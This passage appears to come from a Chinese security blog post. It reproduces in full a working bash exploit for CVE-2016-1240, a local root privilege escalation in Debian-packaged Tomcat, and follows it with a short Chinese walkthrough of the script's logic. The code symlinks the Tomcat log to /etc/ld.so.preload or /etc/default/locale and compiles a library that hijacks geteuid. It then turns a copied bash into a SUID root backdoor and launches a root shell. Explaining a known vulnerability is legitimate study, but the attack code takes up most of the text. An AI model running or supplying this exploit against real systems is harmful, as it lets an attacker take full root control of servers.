&lt;span class=&quot;c&quot;&gt;# It allows attackers with a tomcat shell (e.g. obtained remotely through a &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# vulnerable java webapp, or locally via weak permissions on webapps in the &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Tomcat webroot directories etc.) to escalate their privileges to root.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Usage:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# The exploit can used in two ways:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Attackers can come back at a later time and check on the /etc/default/locale file. Upon a &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# then add arbitrary commands to the file which will be executed with root privileges by &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Ubuntu/Debian Tomcat installations).&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# See full advisory for details at:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Disclaimer:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# For testing purposes only. Do no harm.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
 
&lt;span class=&quot;nv&quot;&gt;BACKDOORSH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/tmp/tomcatrootsh&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PRIVESCLIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/tmp/privesclib.so&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;PRIVESCSRC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/tmp/privesclib.c&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;SUIDBIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/usr/bin/sudo&amp;quot;&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; cleanexit &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Cleanup &lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Cleaning up...&amp;quot;&lt;/span&gt;
    rm -f &lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt;
    rm -f &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt;
    rm -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
    touch &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f /etc/ld.so.preload &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -n &amp;gt; /etc/ld.so.preload 2&amp;gt;/dev/null
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Job done. Exiting with code &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; \n&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ctrl_c&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&amp;quot;&lt;/span&gt;
    cleanexit 0
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;#intro &lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\033[94m \nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\nCVE-2016-1240\n&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&amp;quot;&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Args&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;-lt &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Exploit usage: \n\n&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; path_to_catalina.out [-deferred]\n&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;3
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;-deferred&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;deferred&amp;quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;active&amp;quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Priv check&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Starting the exploit in [\033[94m&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mode&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\033[0m] mode with the following privileges: \n`id`&amp;quot;&lt;/span&gt;
id &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -q tomcat
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] You need to execute the exploit as tomcat user! Exiting.\n&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;3
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Set target paths&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;TOMCATLOG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; ! -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] The specified Tomcat catalina.out log (&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) doesn&amp;#39;t exist. Try again.\n&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;3
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Target Tomcat log file set to &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# [ Deferred exploitation ]&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Symlink the log file to /etc/default/locale file which gets executed daily on default&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# restarted and file owner gets changed.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mode&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;deferred&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    rm -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ln -s /etc/default/locale &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Couldn&amp;#39;t remove the &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; file or create a symlink.&amp;quot;&lt;/span&gt;
        cleanexit 3
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e  &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Symlink created at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e  &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] The current owner of the file is: \n`ls -l /etc/default/locale`&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n    you&amp;#39;ll be able to add arbitrary commands to the file which will get executed with root privileges&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n    at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can&amp;#39;t wait ;)\n\n&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# [ Active exploitation ]&lt;/span&gt;
 
&lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;ctrl_c INT
&lt;span class=&quot;c&quot;&gt;# Compile privesc preload library&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Compiling the privesc shared library (&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)&amp;quot;&lt;/span&gt;
cat &lt;span class=&quot;s&quot;&gt;&amp;lt;&amp;lt;_solibeof_&amp;gt;$PRIVESCSRC&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;#define _GNU_SOURCE&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;#include &amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;#include &amp;lt;dlfcn.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;uid_t geteuid(void) {&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;    static uid_t  (*old_geteuid)();&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;    old_geteuid = dlsym(RTLD_NEXT, &amp;quot;geteuid&amp;quot;);&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;    if ( old_geteuid() == 0 ) {&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;        chown(&amp;quot;$BACKDOORPATH&amp;quot;, 0, 0);&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;        chmod(&amp;quot;$BACKDOORPATH&amp;quot;, 04777);&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;        unlink(&amp;quot;/etc/ld.so.preload&amp;quot;);&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;    return old_geteuid();&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;_solibeof_&lt;/span&gt;
gcc -Wall -fPIC -shared -o &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt; -ldl
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Failed to compile the privesc lib &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCSRC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&amp;quot;&lt;/span&gt;
    cleanexit 2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Prepare backdoor shell&lt;/span&gt;
cp &lt;span class=&quot;nv&quot;&gt;$BACKDOORSH&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Safety check&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f /etc/ld.so.preload &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&amp;quot;&lt;/span&gt;
    cleanexit 2
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Symlink the log file to ld.so.preload&lt;/span&gt;
rm -f &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ln -s /etc/ld.so.preload &lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Couldn&amp;#39;t remove the &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; file or create a symlink.&amp;quot;&lt;/span&gt;
    cleanexit 3
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Symlink created at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TOMCATLOG&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Wait for Tomcat to re-open the logs&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -ne &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart...&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e  &lt;span class=&quot;s2&quot;&gt;&amp;quot;\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)&amp;quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; :&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; 
    sleep 0.1
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; -f /etc/ld.so.preload &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt; &amp;gt; /etc/ld.so.preload
        &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# /etc/ld.so.preload file should be owned by tomcat user at this point&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Inject the privesc.so shared library to escalate privileges&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt; &amp;gt; /etc/ld.so.preload
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \n`ls -l /etc/ld.so.preload`&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Adding &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; shared lib to /etc/ld.so.preload&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&amp;quot;&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Escalating privileges via the &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SUIDBIN&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; SUID binary to get root!&amp;quot;&lt;/span&gt;
sudo --help 2&amp;gt;/dev/null &amp;gt;/dev/null
 
&lt;span class=&quot;c&quot;&gt;# Check for the rootshell&lt;/span&gt;
ls -l &lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep rws &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -q root
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -eq &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt; 
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n\033[94mPlease tell me you&amp;#39;re seeing this too ;) \033[0m&amp;quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[!] Failed to get root&amp;quot;&lt;/span&gt;
    cleanexit 2
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
 
&lt;span class=&quot;c&quot;&gt;# Execute the rootshell&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;\n[+] Executing the rootshell &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; now! \n&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt; -p -c &lt;span class=&quot;s2&quot;&gt;&amp;quot;rm -f /etc/ld.so.preload; rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PRIVESCLIB&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$BACKDOORPATH&lt;/span&gt; -p
 
&lt;span class=&quot;c&quot;&gt;# Job done.&lt;/span&gt;
cleanexit 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;首先是49到66行的cleanexit和ctrl_c函数负责在退出后环境的清理，直至原始的状态。从77到81行看出脚本接受catalina.out的路径和模式的选择，模式分为deferred和active模式，默认为active。83到97行则是检查是否为tomcat用户运行地脚本和对应路径的catalina.out文件是否存在。&lt;/p&gt;

&lt;p&gt;如果设置了deferred参数则会进入105到117行的逻辑，该模式就是被动等待。首先删除catalina.out文件，再建立/etc/default/locale的软链接到catalina.out，等tomcat或系统重启后tomcat用户就可以变成/etc/default/locale的所有者，即可写入任意的命令，最后结合/etc/cron.daily/tomcatN中的计划任务的配置，在每天早上6:25利用root权限来执行写入的任意命令。&lt;/p&gt;

